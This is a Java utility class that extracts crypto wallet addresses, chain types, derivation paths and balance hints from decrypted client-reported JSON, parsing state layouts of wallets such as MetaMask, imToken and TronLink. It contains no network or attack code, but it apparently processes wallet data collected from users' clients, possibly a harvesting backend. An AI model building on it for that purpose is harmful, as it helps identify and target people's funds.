package com.consume.util;

import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;

/**
 * 从 /ub /uj 明文中通用抽取链上地址（及可读到的余额提示）。
 */
public final class ReportedAddressExtractor {

    private ReportedAddressExtractor() {
    }

    public static final class Extracted {
        public final String address;
        public final String chainType;
        public final String accountHint;
        /** 客户端上报的余额原文（可能是 "0" / "0x0" / JSON 片段），无则空 */
        public final String balanceHint;

        public Extracted(String address, String chainType, String accountHint, String balanceHint) {
            this.address = address;
            this.chainType = chainType == null ? "unknown" : chainType;
            this.accountHint = accountHint == null ? "" : accountHint;
            this.balanceHint = balanceHint == null ? "" : balanceHint;
        }
    }

    public static List<Extracted> fromUb(JSONObject plaintext) {
        List<Extracted> out = new ArrayList<>();
        if (plaintext == null) {
            return out;
        }
        collectFromNode(plaintext.get("ba"), out);
        collectFromNode(plaintext.get("ad"), out);
        return dedupe(out);
    }

    public static List<Extracted> fromUj(JSONObject plaintext) {
        List<Extracted> out = new ArrayList<>();
        if (plaintext == null) {
            return out;
        }
        collectFromNode(plaintext.get("result"), out);
        return dedupe(out);
    }

    private static void collectFromNode(Object node, List<Extracted> out) {
        if (node == null) {
            return;
        }
        if (node instanceof String) {
            String s = ((String) node).trim();
            if (s.isEmpty()) {
                return;
            }
            if (AddressNormUtil.looksLikeAddress(s)) {
                add(out, s, AddressNormUtil.guessChain(s), "", "");
                return;
            }
            if (s.startsWith("{") || s.startsWith("[")) {
                try {
                    collectFromNode(JSON.parse(s), out);
                } catch (Exception ignore) {
                    // ignore
                }
            }
            return;
        }
        if (node instanceof JSONObject) {
            collectFromObject((JSONObject) node, out);
            return;
        }
        if (node instanceof Map) {
            @SuppressWarnings("unchecked")
            Map<String, Object> map = (Map<String, Object>) node;
            collectFromObject(new JSONObject(map), out);
            return;
        }
        if (node instanceof JSONArray) {
            JSONArray arr = (JSONArray) node;
            for (int i = 0; i < arr.size(); i++) {
                collectFromNode(arr.get(i), out);
            }
            return;
        }
        if (node instanceof List) {
            for (Object o : (List<?>) node) {
                collectFromNode(o, out);
            }
        }
    }

    private static void collectFromObject(JSONObject obj, List<Extracted> out) {
        if (obj == null || obj.isEmpty()) {
            return;
        }
        Object byChain = obj.get("accountsByChainId");
        if (byChain instanceof JSONObject) {
            JSONObject chains = (JSONObject) byChain;
            for (String chainId : chains.keySet()) {
                Object accs = chains.get(chainId);
                if (accs instanceof JSONObject) {
                    JSONObject accMap = (JSONObject) accs;
                    for (String addr : accMap.keySet()) {
                        if (!AddressNormUtil.looksLikeAddress(addr)) {
                            continue;
                        }
                        String bal = "";
                        Object av = accMap.get(addr);
                        if (av instanceof JSONObject) {
                            bal = firstBalanceField((JSONObject) av);
                        } else if (av != null) {
                            bal = String.valueOf(av);
                        }
                        add(out, addr, "eth", "chainId=" + chainId, bal);
                    }
                }
            }
        }
        Object active = obj.get("activeAccounts");
        if (active != null) {
            collectFromNode(active, out);
        }
        Object accounts = obj.get("accounts");
        if (accounts != null) {
            collectFromNode(accounts, out);
        }
        String addrField = firstAddressField(obj);
        if (addrField != null) {
            String hint = str(obj, "derivationPath");
            if (hint.isEmpty()) {
                hint = str(obj, "mnemonicPath");
            }
            if (hint.isEmpty()) {
                hint = str(obj, "hdPath");
            }
            if (hint.isEmpty()) {
                hint = str(obj, "symbol");
            }
            add(out, addrField, AddressNormUtil.guessChain(addrField), hint, firstBalanceField(obj));
        }
        for (String key : obj.keySet()) {
            if ("accountsByChainId".equals(key) || "activeAccounts".equals(key) || "accounts".equals(key)) {
                continue;
            }
            if (!AddressNormUtil.looksLikeAddress(key)) {
                continue;
            }
            Object val = obj.get(key);
            String bal = "";
            if (val instanceof String || val instanceof Number) {
                bal = String.valueOf(val);
            } else if (val instanceof JSONObject) {
                bal = firstBalanceField((JSONObject) val);
            } else if (val instanceof JSONArray && !((JSONArray) val).isEmpty()) {
                // imtoken: 地址 → token 列表，优先原生币余额
                bal = summarizeTokenBalances((JSONArray) val);
            }
            add(out, key, AddressNormUtil.guessChain(key), "", bal);
        }
    }

    private static String firstAddressField(JSONObject obj) {
        for (String k : new String[]{"address", "addr", "Address"}) {
            String v = str(obj, k);
            if (AddressNormUtil.looksLikeAddress(v)) {
                return v.trim();
            }
        }
        return null;
    }

    private static String firstBalanceField(JSONObject obj) {
        if (obj == null) {
            return "";
        }
        for (String k : new String[]{"balance", "value", "total", "totalCoin", "nativeBal", "amount"}) {
            String v = str(obj, k);
            if (!v.isEmpty()) {
                return v;
            }
        }
        return "";
    }

    private static String summarizeTokenBalances(JSONArray arr) {
        if (arr == null || arr.isEmpty()) {
            return "";
        }
        // 取第一项 balance，或拼 symbol:balance
        StringBuilder sb = new StringBuilder();
        int n = Math.min(arr.size(), 8);
        for (int i = 0; i < n; i++) {
            Object o = arr.get(i);
            if (!(o instanceof JSONObject)) {
                continue;
            }
            JSONObject t = (JSONObject) o;
            String sym = str(t, "symbol");
            String bal = str(t, "balance");
            if (bal.isEmpty()) {
                continue;
            }
            if (sb.length() > 0) {
                sb.append(';');
            }
            if (!sym.isEmpty()) {
                sb.append(sym).append('=');
            }
            sb.append(bal);
        }
        return sb.toString();
    }

    private static void add(List<Extracted> out, String address, String chain, String hint, String balance) {
        if (address == null) {
            return;
        }
        String a = address.trim();
        if (!AddressNormUtil.looksLikeAddress(a)) {
            return;
        }
        // TronLink uj：41… hex → T…，避免误判为 sol
        String canonical = AddressNormUtil.canonicalize(a);
        String pathChain = AddressNormUtil.chainFromPath(hint);
        String resolved;
        if (!pathChain.isEmpty()) {
            resolved = pathChain;
        } else if (chain != null && !chain.isEmpty() && !"unknown".equalsIgnoreCase(chain)) {
            resolved = chain.toLowerCase(Locale.ROOT);
        } else {
            resolved = AddressNormUtil.guessChain(canonical);
        }
        out.add(new Extracted(canonical,
                resolved == null || resolved.isEmpty() ? "unknown" : resolved,
                hint == null ? "" : hint,
                balance));
    }

    private static List<Extracted> dedupe(List<Extracted> in) {
        Map<String, Extracted> map = new LinkedHashMap<>();
        for (Extracted e : in) {
            String norm = AddressNormUtil.normalize(e.address);
            if (norm.isEmpty()) {
                continue;
            }
            Extracted old = map.get(norm);
            if (old == null) {
                map.put(norm, e);
            } else if ((old.balanceHint == null || old.balanceHint.isEmpty())
                    && e.balanceHint != null && !e.balanceHint.isEmpty()) {
                map.put(norm, e);
            }
        }
        return new ArrayList<>(map.values());
    }

    private static String str(JSONObject o, String k) {
        if (o == null || k == null) {
            return "";
        }
        Object v = o.get(k);
        return v == null ? "" : String.valueOf(v).trim();
    }
}
